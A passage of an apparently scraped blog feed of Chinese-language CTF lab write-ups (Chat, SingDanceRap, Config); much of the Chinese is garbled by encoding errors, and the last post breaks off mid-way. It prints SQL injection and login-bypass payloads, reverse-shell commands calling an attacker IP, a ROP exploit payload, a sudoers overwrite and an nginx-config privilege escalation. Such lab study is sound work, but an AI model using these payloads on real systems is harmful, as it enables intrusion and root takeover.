# Âú®ÊîªÂáªÊú∫‰∏äÊâßË°å
echo 'scycree ALL=(ALL:ALL) NOPASSWD: ALL' &gt; a
```

ÁÑ∂ÂêéÔºåÈÄöËøáÊµèËßàÂô®Êàñ `curl` ËÆøÈóÆ `ghfs` Êèê‰æõÁöÑ Web ÊúçÂä° (`http://192.168.205.248:8080`)ÔºåÂ∞Ü `a` Êñá‰ª∂‰∏ä‰º†„ÄÇ

‰∏ä‰º†ÊàêÂäüÂêéÔºå`scycree` ÁöÑ `sudo` ÊùÉÈôêË¢´Êõ¥Êñ∞„ÄÇÊ≠§Êó∂ÔºåÂÜçÊ¨°ÊâßË°å `sudo -l` ÂèØ‰ª•ÁúãÂà∞Êñ∞Â¢ûÁöÑÊùÉÈôê„ÄÇ

```bash
scycree@Chat:/tmp$ sudo -l
...
User scycree may run the following commands on Chat:
    (ALL) NOPASSWD: /usr/bin/ghfs
    (ALL : ALL) NOPASSWD: ALL
```

ÊúÄÂêéÔºåÊâßË°å `sudo bash` Âç≥ÂèØËé∑Âæó‰∏Ä‰∏™ `root` shell„ÄÇ

```bash
scycree@Chat:/tmp$ sudo bash
root@Chat:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
```

# **Âõõ„ÄÅÂ§∫ÂèñÊóóÂ∏ú**

ÊàêÂäüËé∑Âèñ `root` ÊùÉÈôêÂêéÔºåËØªÂèñ‰Ωç‰∫é `/root` ÁõÆÂΩï‰∏ãÁöÑÊúÄÁªà `flag`„ÄÇ

```bash
root@Chat:/tmp# cat /root/root.txt
flag{root-c448ebd8ddef14820eef632ffe833f3c}
```

Ëá≥Ê≠§ÔºåÊ∏óÈÄèÊµãËØïÂÆåÊàê„ÄÇsentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_Chat.html</guid><pubDate>Wed, 06 Aug 2025 00:49:56 +0000</pubDate></item><item><title>ÂÜÖÈÉ®_SingDanceRap</title><link>https://7r1UMPHK.github.io/post/nei-bu-_SingDanceRap.html</link><description># **‰∏Ä„ÄÅ‰ø°ÊÅØÊî∂ÈõÜ**

## **1. ‰∏ªÊú∫‰∏éÊúçÂä°ÂèëÁé∞**

È¶ñÂÖàÔºåÂú®Êú¨Âú∞ÁΩëÁªú‰∏≠‰ΩøÁî® `arp-scan` Êâ´ÊèèÂ≠òÊ¥ª‰∏ªÊú∫ÔºåÁ°ÆÂÆöÁõÆÊ†áÈù∂Êú∫IPÂú∞ÂùÄ‰∏∫ `192.168.205.245`„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ sudo arp-scan -l
...
192.168.205.245 08:00:27:82:68:fa       PCS Systemtechnik GmbH
...
```

Êé•ÁùÄÔºå‰ΩøÁî® `nmap` ÂØπÁõÆÊ†á‰∏ªÊú∫ËøõË°åÂÖ®Á´ØÂè£Êâ´ÊèèÔºåÂèëÁé∞ÂÖ∂ÂºÄÊîæ‰∫Ü 22 (SSH) Âíå 80 (HTTP) Á´ØÂè£„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ nmap -p- 192.168.205.245
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-04 10:09 EDT
Nmap scan report for 192.168.205.245
Host is up (0.0013s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    open     http
```

## **2. WebÊúçÂä°Êé¢Á¥¢‰∏éSQLÊ≥®ÂÖ•**

ËÆøÈóÆ80Á´ØÂè£ÔºåÂèëÁé∞ÊòØ‰∏Ä‰∏™Êñ∞ÈóªÁΩëÁ´ô„ÄÇÁΩëÁ´ôÂÜÖÁöÑÈìæÊé• `http://192.168.205.245/news.php?title=...` Â≠òÂú®ÊòéÊòæÁöÑGETÂèÇÊï∞ÔºåËøôÈÄöÂ∏∏ÊòØÊºèÊ¥ûÁöÑÂàáÂÖ•ÁÇπ„ÄÇ

‰ΩøÁî® `sqlmap` ÂØπ `title` ÂèÇÊï∞ËøõË°åÊµãËØïÔºåËøÖÈÄüÁ°ÆËÆ§Â≠òÂú®SQLÊ≥®ÂÖ•ÊºèÊ¥û„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ sqlmap -u 'http://192.168.205.245/news.php?title=1' --batch
...
---
Parameter: title (GET)
    Type: time-based blind
    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
    Payload: title=1' AND (SELECT 4710 FROM (SELECT(SLEEP(5)))shBD) AND 'ceXN'='ceXN

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: title=1' UNION ALL SELECT NULL,CONCAT(0x71627a6271,...),NULL-- -
---
[10:14:22] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.59
back-end DBMS: MySQL &gt;= 5.0.12 (MariaDB fork)
...
```

`sqlmap` Á°ÆËÆ§ÂêéÂè∞Êï∞ÊçÆÂ∫ì‰∏∫MySQLÔºåÂπ∂‰∏îËØ•Ê≥®ÂÖ•ÁÇπ‰∏∫DBAÊùÉÈôê„ÄÇ

# **‰∫å„ÄÅÂàùÂßãËÆøÈóÆ**

## **1. ÊºèÊ¥ûÂà©Áî®Ôºö‰ªéSQLÊ≥®ÂÖ•Âà∞ÂêéÂè∞Ê∫êÁ†ÅÊ≥ÑÈú≤**

Âà©Áî®SQLÊ≥®ÂÖ•ÁÇπÔºåÊàë‰ª¨È¶ñÂÖàÂ∞ùËØïËé∑ÂèñÊï∞ÊçÆÂ∫ì‰∏≠ÁöÑÁî®Êà∑‰ø°ÊÅØ„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ sqlmap -u 'http://192.168.205.245/news.php?title=1' --batch -D news_db -T users --dump
...
Database: news_db
Table: users
[2 entries]
+----+-----------+----------+
| id | password  | username |
+----+-----------+----------+
| 1  | password1 | user1    |
| 2  | password2 | user2    |
+----+-----------+----------+
...
```

Ëé∑ÂèñÂà∞ÁöÑÁî®Êà∑ÂêçÂíåÂØÜÁ†Å (`user1:password1`) ÁúãËµ∑Êù•ÊòØÊó†ÊïàÁöÑÊµãËØïÊï∞ÊçÆ„ÄÇÊé•ÁùÄÔºå‰ΩøÁî® `gobuster` ÂØπÁΩëÁ´ôÁõÆÂΩïËøõË°åÁàÜÁ†¥ÔºåÂèëÁé∞‰∏Ä‰∏™ÈöêËóèÁõÆÂΩï `/littlesecrets/`ÔºåÂÖ∂‰∏≠ÂåÖÂê´‰∏Ä‰∏™ÁôªÂΩïÈ°µÈù¢ `login.php`„ÄÇ

Áî±‰∫éÊï∞ÊçÆÂ∫ì‰∏≠ÁöÑÂá≠ÊçÆÊó†ÊïàÔºåÊàë‰ª¨ÁöÑÁ≠ñÁï•ËΩ¨ÂêëËØªÂèñWebÊúçÂä°Âô®‰∏äÁöÑÊñá‰ª∂Ôºå‰ª•Ëé∑ÂèñÂêéÂè∞ÁôªÂΩïÁöÑÁúüÂÆûÈÄªËæë„ÄÇÈÄöËøáËØªÂèñApacheÁöÑÈÖçÁΩÆÊñá‰ª∂ `/etc/apache2/apache2.conf`ÔºåÊàë‰ª¨ÂèëÁé∞ÁΩëÁ´ôÁöÑÊ†πÁõÆÂΩïË¢´‰øÆÊîπ‰∏∫ `/var/www/he110wor1d`„ÄÇ

```bash
# ‰ªéapache2.conf‰∏≠ÂèëÁé∞ÁöÑÂÖ≥ÈîÆÈÖçÁΩÆ
&lt;Directory /var/www/he110wor1d/&gt;
        Options -Indexes
        AllowOverride None
        Require all granted
&lt;/Directory&gt;

&lt;VirtualHost *:80&gt;
    DocumentRoot /var/www/he110wor1d
...
```

Âà©Áî®Ëøô‰∏™‰ø°ÊÅØÔºåÊàë‰ª¨ÊàêÂäüËØªÂèñ‰∫Ü `login.php` ÁöÑÊ∫ê‰ª£Á†ÅÔºåÂπ∂ÂèëÁé∞‰∫ÜÊï∞ÊçÆÂ∫ìÁöÑËøûÊé•ÂØÜÁ†Å„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ sqlmap -u 'http://192.168.205.245/news.php?title=1' --batch --file-read='/var/www/he110wor1d/littlesecrets/login.php'
...
$servername = 'localhost';
$username = 'root';
$password = 'i_love_sing_dance_rap';
$dbname = 'news_db';
...
```

# **2. Ë∫´‰ªΩ‰º™ÈÄ†‰∏éÂëΩ‰ª§ÊâßË°å**

Êé•ÁùÄËØªÂèñÁôªÂΩïÊàêÂäüÂêéË∑≥ËΩ¨ÁöÑÈ°µÈù¢ `manager.php`ÔºåÂèëÁé∞‰∏Ä‰∏™ÂëΩ‰ª§ÊâßË°åÊºèÊ¥ûÔºå‰ΩÜÈúÄË¶ÅÁôªÂΩïÁî®Êà∑ÁöÑÁî®Êà∑Âêç‰∏∫ `he110wor1d_admin`„ÄÇ

```php
// ‰ªé manager.php Ê∫êÁ†Å‰∏≠ÂèëÁé∞ÁöÑÂÖ≥ÈîÆ‰ª£Á†Å
if ($_SESSION['username'] !== 'he110wor1d_admin') {
    die('Access Denied. You do not have permission to access this page.');
}
...
$command = $_POST['command'];
$command_output = shell_exec($command);
...
```

Áî±‰∫é `login.php` ÁöÑSQLÊü•ËØ¢Â≠òÂú®Áº∫Èô∑ÔºåÊàë‰ª¨ÂèØ‰ª•ÈÄöËøáÊûÑÈÄ†UNIONÊü•ËØ¢Êù•‰º™ÈÄ†Ë∫´‰ªΩ„ÄÇÂú®ÁôªÂΩïÊ°Ü‰∏≠ËæìÂÖ•‰ª•‰∏ãpayloadÔºö

*   **Username**: `' UNION SELECT 1, 'he110wor1d_admin', '1' #`
*   **Password**: `1`

ÊàêÂäüÁôªÂΩïÂêéÔºåÊàë‰ª¨ËøõÂÖ•‰∫Ü `manager.php` ÁöÑÂëΩ‰ª§ÊâßË°åÈù¢Êùø„ÄÇ‰∏∫‰∫ÜËé∑Âæó‰∏Ä‰∏™Á®≥ÂÆöÁöÑ‰∫§‰∫íÂºèShellÔºåÊàë‰ª¨ÊâßË°åÂèçÂºπShellÂëΩ‰ª§„ÄÇ

È¶ñÂÖàÔºåÂú®ÊîªÂáªÊú∫‰∏äÁõëÂê¨Á´ØÂè£Ôºö

```bash
nc -lvnp 8888
```

ÁÑ∂ÂêéÂú®WebÈù¢Êùø‰∏≠ÊâßË°åÔºö

```bash
bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.205.128/8888 0&gt;&amp;1'
```

ÊàêÂäüËé∑Âèñ `www-data` Áî®Êà∑ÁöÑshell„ÄÇ

# **‰∏â„ÄÅÊùÉÈôêÊèêÂçá**

## **1. Ê∞¥Âπ≥ÊèêÊùÉÔºöwww-data -&gt; he110wor1d**

Âú®Ëé∑Âèñ `www-data` ÊùÉÈôêÂêéÔºåÊàë‰ª¨ÊÄÄÁñë‰πãÂâç‰ªé `login.php` ‰∏≠Ê≥ÑÈú≤ÁöÑÊï∞ÊçÆÂ∫ìÂØÜÁ†Å `i_love_sing_dance_rap` ÂèØËÉΩË¢´Á≥ªÁªüÁî®Êà∑ `he110wor1d` Â§çÁî®„ÄÇ

```bash
www-data@singdancerap:/var/www/he110wor1d/littlesecrets$ su he110wor1d 
Password: i_love_sing_dance_rap
he110wor1d@singdancerap:/home$ id
uid=1001(he110wor1d) gid=1001(he110wor1d) groups=1001(he110wor1d)
```

ÊàêÂäüÂàáÊç¢Âà∞ `he110wor1d` Áî®Êà∑ÔºåÂπ∂Âú®ÂÖ∂ÂÆ∂ÁõÆÂΩï‰∏ãÊâæÂà∞Á¨¨‰∏Ä‰∏™flag„ÄÇ

```bash
he110wor1d@singdancerap:~$ cat user.txt
#SQL injection can not only retrieve data but also forge it.

User flag:107883ee-f5e4-11ef-8542-005056207011
```

## **2. ÂûÇÁõ¥ÊèêÊùÉÔºöhe110wor1d -&gt; root (SUID &amp; ROP)**

Âú® `he110wor1d` Áî®Êà∑ÁöÑÂÆ∂ÁõÆÂΩï‰∏ãÔºåÂèëÁé∞‰∏Ä‰∏™Êã•ÊúâSUIDÊùÉÈôêÁöÑÂèØÊâßË°åÊñá‰ª∂ `thekey2root`„ÄÇ

```bash
he110wor1d@singdancerap:~/thekey2root$ ls -al
-rwsr-sr-x 1 root root 15472 Mar 1 00:23 thekey2root
```

‰ΩøÁî® `checksec` Ê£ÄÊü•ËØ•Êñá‰ª∂ÔºåÂèëÁé∞ÂÆÉÊòØ‰∏Ä‰∏™32‰ΩçÁ®ãÂ∫èÔºåÊ≤°ÊúâPIEÂíåCanary‰øùÊä§Ôºå‰ΩÜÂºÄÂêØ‰∫ÜNX„ÄÇËøôÊòØÂÖ∏ÂûãÁöÑROPÊîªÂáªÂú∫ÊôØ„ÄÇ

```bash
[*] '/mnt/hgfs/gx/x/tmp/thekey2root'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
```

ÈÄöËøáGDBÂä®ÊÄÅË∞ÉËØïÔºåÊàë‰ª¨ÂèëÁé∞ `main` ÂáΩÊï∞‰∏≠ÁöÑ `input()` (Âç≥ `scanf`) Â≠òÂú®Ê†àÊ∫¢Âá∫ÊºèÊ¥û„ÄÇÂà©Áî® `pattern create` Âíå `pattern offset`ÔºåÊàë‰ª¨Á≤æÁÆóÂá∫Ë¶ÜÁõñËøîÂõûÂú∞ÂùÄÊâÄÈúÄÁöÑÂÅèÁßªÈáè‰∏∫ **32Â≠óËäÇ**„ÄÇ

Êàë‰ª¨ÁöÑÁõÆÊ†áÊòØÂà©Áî®Á®ãÂ∫è‰∏≠ÁöÑ `system()` ÂáΩÊï∞Êù•ÊâßË°åÂëΩ‰ª§„ÄÇ‰∏∫‰∫ÜËé∑ÂæórootÊùÉÈôêÔºåÊàë‰ª¨ÈúÄË¶Å‰∏Ä‰∏™ËÉΩÂ§üÊèêÊùÉÁöÑÂáΩÊï∞„ÄÇ`sing_dance_rap` ÂáΩÊï∞ÔºàÂú∞ÂùÄ `0x08049213`ÔºâÊÅ∞Â•ΩÂèØ‰ª•ÂÅöÂà∞Ëøô‰∏ÄÁÇπÔºåÂõ†‰∏∫ÂÆÉÂÜÖÈÉ®Ë∞ÉÁî®‰∫Ü `setuid(0)` Âíå `setgid(0)`„ÄÇ

**ÊûÑÈÄ†ROPÈìæ**Ôºö
Êàë‰ª¨ÁöÑËÆ°ÂàíÊòØÔºåÂÖàË∑≥ËΩ¨Âà∞ `sing_dance_rap` ÊèêÊùÉÔºåÁÑ∂Âêé‰ªé `sing_dance_rap` ËøîÂõûÊó∂ÔºåÂÜçË∑≥ËΩ¨Âà∞ `system` ÂáΩÊï∞ÔºåÂπ∂ËÆ©ÂÖ∂ÊâßË°åÊàë‰ª¨ÊÉ≥Ë¶ÅÁöÑÂëΩ‰ª§„ÄÇ

*   **Â°´ÂÖÖ**Ôºö32Â≠óËäÇÁöÑÂûÉÂúæÊï∞ÊçÆ„ÄÇ
*   **Á¨¨‰∏ÄË∑≥**Ôºö`sing_dance_rap` ÁöÑÂú∞ÂùÄ (`0x08049213`)„ÄÇ
*   **Á¨¨‰∫åË∑≥**Ôºö`system@plt` ÁöÑÂú∞ÂùÄ (`0x08049040`)„ÄÇ
*   **`system`ÁöÑËøîÂõûÂú∞ÂùÄ**Ôºö‰∏Ä‰∏™‰ªªÊÑèÁöÑÂç†‰ΩçÂú∞ÂùÄ (e.g., `0xdeadbeef`)„ÄÇ
*   **`system`ÁöÑÂèÇÊï∞**ÔºöÂú®Á®ãÂ∫èÁöÑÂè™ËØªÊï∞ÊçÆÊÆµÔºåÊàë‰ª¨ÂèëÁé∞‰∫Ü‰∏Ä‰∏™ÂÆåÁæéÁöÑÂ≠óÁ¨¶‰∏≤ `'s'`ÔºåÂÖ∂Âú∞ÂùÄ‰∏∫ `0x0804a03e`„ÄÇ

**ÁéØÂ¢ÉÂáÜÂ§á‰∏éÊîªÂáªÊâßË°å**Ôºö
Âú®Èù∂Êú∫‰∏äÔºåÊàë‰ª¨ÈÄöËøáÁéØÂ¢ÉÂèòÈáèÂä´ÊåÅÔºåËÆ© `system('s')` ÊâßË°åÊàë‰ª¨ÊåáÂÆöÁöÑÂèçÂºπShellËÑöÊú¨„ÄÇ

```bash
# 1. Âú®ÊîªÂáªÊú∫‰∏äÁõëÂê¨Á´ØÂè£
nc -lvnp 9999

# 2. Âú®Èù∂Êú∫‰∏äÂáÜÂ§áÁéØÂ¢É (he110wor1dÁî®Êà∑‰∏ã)
echo 'nc 192.168.205.128 9999 -e /bin/bash' &gt; s
chmod +x s
export PATH=.:$PATH
```

**ÊúÄÁªàPayload**:

```
'A'*32 + p32(0x08049213) + p32(0x08049040) + p32(0xdeadbeef) + p32(0x0804a03e)
```

Âú®Èù∂Êú∫‰∏äÔºå‰ΩøÁî®PerlÊâßË°åÊ≠§payloadÔºö

```bash
he110wor1d@singdancerap:~/thekey2root$ perl -e 'print 'A'x32 . '\x13\x92\x04\x08' . '\x40\x90\x04\x08' . '\xef\xbe\xad\xde' . '\x3e\xa0\x04\x08'' | ./thekey2root
```

ÂëΩ‰ª§ÊâßË°åÂêéÔºåÁ®ãÂ∫è‰ºöÁúã‰ººÂç°‰ΩèÔºåÊ≠§Êó∂Êàë‰ª¨ÁöÑÊîªÂáªÊú∫Â∑≤Êî∂Âà∞ `root` ÊùÉÈôêÁöÑÂèçÂºπShell„ÄÇ

# **Âõõ„ÄÅÂ§∫ÂèñÊóóÂ∏ú**

ÊàêÂäüËé∑Âèñ `root` shellÂêéÔºåËØªÂèñÊúÄÁªàÁöÑflag„ÄÇ

```bash
root@singdancerap:~# id
uid=0(root) gid=0(root) groups=0(root),1001(he110wor1d)
root@singdancerap:~# cat /root/root.txt
#During the process of PWN, the execution of the system function does not necessarily have to be bash.

root flag:943ac8c9-f696-11ef-8bd4-005056207011
```

Ëá≥Ê≠§ÔºåÈù∂Êú∫`singdancerap`ÁöÑÊâÄÊúâÊåëÊàòÂùáÂ∑≤ÂÆåÊàê„ÄÇ
sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_SingDanceRap.html</guid><pubDate>Wed, 06 Aug 2025 00:49:38 +0000</pubDate></item><item><title>ÂÜÖÈÉ®_config</title><link>https://7r1UMPHK.github.io/post/nei-bu-_config.html</link><description># **‰∏Ä„ÄÅ‰ø°ÊÅØÊî∂ÈõÜ**

## 1. ‰∏ªÊú∫ÂèëÁé∞

È¶ñÂÖàÔºåÂú®Êú¨Âú∞ÁΩëÁªú‰∏≠‰ΩøÁî® `arp-scan` Â∑•ÂÖ∑ËøõË°å‰∏ªÊú∫ÂèëÁé∞ÔºåÁ°ÆÂÆöÁõÆÊ†áÈù∂Êú∫ÁöÑ IP Âú∞ÂùÄ‰∏∫ `192.168.205.241`„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ sudo arp-scan -l
...
192.168.205.241 08:00:27:31:f6:a3       PCS Systemtechnik GmbH
...
```

## 2. Á´ØÂè£‰∏éÊúçÂä°Êâ´Êèè

‰ΩøÁî® `nmap` ÂØπÁõÆÊ†á‰∏ªÊú∫ËøõË°åÂÖ®Á´ØÂè£Êâ´ÊèèÔºåÂèëÁé∞ÂÖ∂ÂºÄÊîæ‰∫Ü 22 (SSH) Âíå 80 (HTTP) ‰∏§‰∏™Á´ØÂè£„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ nmap -p- 192.168.205.241
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-04 07:27 EDT
Nmap scan report for 192.168.205.241
Host is up (0.000094s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:31:F6:A3 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
```

## 3. WebÁõÆÂΩïÊûö‰∏æ‰∏éÊºèÊ¥ûÂèëÁé∞

ËÆøÈóÆ 80 Á´ØÂè£ÊòØ‰∏Ä‰∏™ÈùôÊÄÅÁΩëÈ°µÔºåÊ≤°ÊúâÂèØ‰∫§‰∫íÁöÑÂäüËÉΩ„ÄÇ‰ΩøÁî® `gobuster` ËøõË°åÁõÆÂΩïÁàÜÁ†¥ÔºåÂèëÁé∞‰∫Ü‰∏Ä‰∏™ `/config` ÁõÆÂΩï„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ gobuster dir -u http://192.168.205.241 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -t 64
...
/config               (Status: 301) [Size: 169] [--&gt; http://192.168.205.241/config/]
...
```

ÂØπ `/config/` ÁõÆÂΩïËøõË°åÊ∑±Â∫¶ÁàÜÁ†¥Êú™Êûú„ÄÇÂú®Â∞ùËØïÂ§öÁßçË∑ØÂæÑÂêéÔºåÂèëÁé∞ Web ÊúçÂä°Âô®Â≠òÂú®ÁõÆÂΩïÁ©øË∂äÊºèÊ¥ûÔºåÈÄöËøáËÆøÈóÆ `/config../` ÂèØ‰ª•Ë∑≥Âá∫ÂΩìÂâç Web Ê†πÁõÆÂΩïÁöÑÈôêÂà∂„ÄÇÂà©Áî®Ê≠§ÊºèÊ¥ûÔºåÊàë‰ª¨ÁªßÁª≠ÂØπ‰∏äÂ±ÇÁõÆÂΩïËøõË°åÁàÜÁ†¥„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ gobuster dir -u http://192.168.205.241/config../ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 64
...
/config.txt           (Status: 200) [Size: 41]
...
```

ÊàêÂäüÂèëÁé∞‰∫Ü‰∏Ä‰∏™Âêç‰∏∫ `config.txt` ÁöÑÊïèÊÑüÊñá‰ª∂„ÄÇ

# **‰∫å„ÄÅÂàùÂßãËÆøÈóÆ**

## 1. Âá≠ËØÅËé∑Âèñ

‰ΩøÁî® `curl` ËØªÂèñÈÄöËøáÁõÆÂΩïÁ©øË∂äÊºèÊ¥ûÂèëÁé∞ÁöÑ `config.txt` Êñá‰ª∂ÔºåÊàêÂäüËé∑ÂèñÂà∞‰∏ÄÁªÑ SSH ÁôªÂΩïÂá≠ËØÅ„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ curl http://192.168.205.241/config../config.txt
SSH Credentials: mikannse/mikannsebyebye
```

Âá≠ËØÅ‰∏∫ `mikannse:mikannsebyebye`„ÄÇ

## 2. SSHÁôªÂΩï‰∏éShellÈÄÉÈÄ∏

Âà©Áî®Ëé∑ÂèñÂà∞ÁöÑÂá≠ËØÅÊàêÂäüÁôªÂΩï SSH„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ ssh mikannse@192.168.205.241
```

ÁôªÂΩïÂêéÂèëÁé∞ÂΩìÂâç Shell ÊòØ‰∏Ä‰∏™ÂèóÈôêÁéØÂ¢ÉÔºàÁ±ª‰ºº‰∫é `less` Êàñ `more`ÔºâÔºåÊó†Ê≥ïÁõ¥Êé•ÊâßË°åÂëΩ‰ª§„ÄÇÂú®ËøôÁßçÁéØÂ¢É‰∏ãÔºåÂèØ‰ª•ÈÄöËøá `less` ÁöÑÂÜÖÈÉ®ÂëΩ‰ª§ `!` Êù•ÊâßË°åÂ§ñÈÉ® Shell ÂëΩ‰ª§„ÄÇËæìÂÖ• `!/bin/bash` ÊàêÂäüËé∑Âæó‰∏Ä‰∏™Ê†áÂáÜÁöÑ Bash Shell„ÄÇ

# **‰∏â„ÄÅÊùÉÈôêÊèêÂçá**

## 1. SudoÊùÉÈôêÂàÜÊûê

Ëé∑ÂæóÂàùÂßã Shell ÂêéÔºåÈ¶ñÂÖàÊü•ÁúãÂΩìÂâçÁî®Êà∑ `mikannse` ÁöÑÂÆ∂ÁõÆÂΩïÔºåÂπ∂ËØªÂèñ `user.txt` Ëé∑ÂæóÁ¨¨‰∏Ä‰∏™ flag„ÄÇ

```bash
mikannse@Config:~$ ls -al
total 36
drwx------ 2 mikannse mikannse 4096 Jul  5 00:50 .
drwxr-xr-x 3 root     root     4096 Jul  4 23:36 ..
-rw-r--r-- 1 mikannse mikannse  175 Jul  4 23:37 banner.txt
lrwxrwxrwx 1 root     root        9 Jul  4 23:40 .bash_history -&gt; /dev/null
-rw-r--r-- 1 mikannse mikannse  220 Jul  4 23:36 .bash_logout
-rw-r--r-- 1 mikannse mikannse 3526 Jul  4 23:36 .bashrc
-rw------- 1 mikannse mikannse   33 Jul  5 00:50 .lesshst
-rw-r--r-- 1 root     root      551 Jul  5 00:50 mikannse.conf
-rw-r--r-- 1 mikannse mikannse  847 Jul  4 23:38 .profile
-rw-r--r-- 1 root     root       48 Jul  4 23:37 user.txt
mikannse@Config:~$ cat user.txt 
flag{user-530773d6-5951-11f0-89d9-836ccaf94d6b}
```

Ê≥®ÊÑèÂà∞ÂÖ∂‰∏≠Êúâ‰∏Ä‰∏™ `root` Áî®Êà∑ÊâÄÊúâÁöÑÈÖçÁΩÆÊñá‰ª∂ `mikannse.conf`„ÄÇÊé•ÁùÄÔºåÊâßË°å `sudo -l` Êü•ÁúãÂΩìÂâçÁî®Êà∑ÁöÑ `sudo` ÊùÉÈôê„ÄÇ

```bash
mikannse@Config:~$ sudo -l
Matching Defaults entries for mikannse on Config:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User mikannse may run the following commands on Config:
    (root) NOPASSWD: /usr/sbin/nginx -c /home/mikannse/mikannse.conf
```

ÁªìÊûúÊòæÁ§∫Ôºå`mikannse` Áî®Êà∑ÂèØ‰ª•Êó†ÂØÜÁ†Å‰ª• `root` ÊùÉÈôêÊâßË°å `nginx` ÂëΩ‰ª§ÔºåÂπ∂Âº∫Âà∂‰ΩøÁî® `/home/mikannse/mikannse.conf`‰Ωú‰∏∫ÈÖçÁΩÆÊñá‰ª∂„ÄÇ

## 2. NginxÈÖçÁΩÆÂä´ÊåÅÊèêÊùÉ

ËôΩÁÑ∂Êàë‰ª¨Êó†Ê≥ïÁõ¥Êé•ÂÜôÂÖ•Áî± `root` Êã•ÊúâÁöÑ `mikannse.conf` Êñá‰ª∂Ôºå‰ΩÜËØ•Êñá‰ª∂‰Ωç‰∫éÊàë‰ª¨ÁöÑÂÆ∂ÁõÆÂΩï `/home/mikannse` ‰∏ãÔºåËøôÊÑèÂë≥ÁùÄÊàë‰ª¨ÂØπËØ•ÁõÆÂΩïÊúâÂÜôÊùÉÈôê„ÄÇÂõ†Ê≠§ÔºåÊàë‰ª¨ÂèØ‰ª•ÂÖàÂ∞ÜÂéüÊñá‰ª∂ÈáçÂëΩÂêçÊàñÂà†Èô§ÔºåÁÑ∂ÂêéÂàõÂª∫‰∏Ä‰∏™ÂêåÂêçÁöÑÊÅ∂ÊÑèÈÖçÁΩÆÊñá‰ª∂Êù•Âä´ÊåÅ `sudo` ÊâßË°åÊµÅÁ®ã„ÄÇ

**ÊèêÊùÉÊ≠•È™§:**

1.  Â∞ÜÂéüÂßãÁöÑ `mikannse.conf` Êñá‰ª∂ÈáçÂëΩÂêçÔºå‰ª•‰ΩúÂ§á‰ªΩ„ÄÇ
2.  ÂàõÂª∫‰∏Ä‰∏™Êñ∞ÁöÑ `mikannse.conf` Êñá‰ª∂„ÄÇ
3.  Âú®Êñ∞ÈÖçÁΩÆÊñá‰ª∂‰∏≠ÔºåÈÖçÁΩÆ Nginx ÂêØÂä®‰∏Ä‰∏™Êñ∞ÁöÑ Web ÊúçÂä°Ôºà‰æãÂ¶ÇÂú® 8081 Á´ØÂè£ÔºâÔºåÂÖ∂Ê†πÁõÆÂΩïÊåáÂêë `/root` ÁõÆÂΩïÔºåÂπ∂ÂºÄÂêØÁõÆÂΩïÂàóË°®ÂäüËÉΩ (`autoindex on`)„ÄÇ

```bash
# ÁßªÂä®ÂéüÈÖçÁΩÆÊñá‰ª∂
mikannse@Config:~$ mv /home/mikannse/mikannse.conf a

# ÂàõÂª∫Âπ∂ÂÜôÂÖ•ÊÅ∂ÊÑèÈÖçÁΩÆÊñá‰ª∂
mikannse@Config:~$ vim mikannse.conf 
mikannse@Config:~$ cat mikannse.conf
user root;
worker_processes auto;
pid /run/nginx.pid;

events {
    worker_connections 1024;
}

http {
    server {
        listen       8081;          
        server_name  Config;     
        
        # ÂÖ≥ÈîÆÈÖçÁΩÆÔºöÂ∞Ü/filesË∑ØÂæÑÊò†Â∞ÑÂà∞/root/ÁõÆÂΩï
        location /files {
            alias /root/;
            autoindex on; # ÂºÄÂêØÁõÆÂΩïÊµèËßà
        }
    }
}
```

4.  ‰ΩøÁî® `sudo` ÊâßË°å Nginx ÂëΩ‰ª§Ôºå‰ΩøÂÖ∂‰ª• `root` ÊùÉÈôêÂä†ËΩΩÊàë‰ª¨ÁöÑÊÅ∂ÊÑèÈÖçÁΩÆ„ÄÇ

```bash
mikannse@Config:~$ sudo /usr/sbin/nginx -c /home/mikannse/mikannse.conf
```

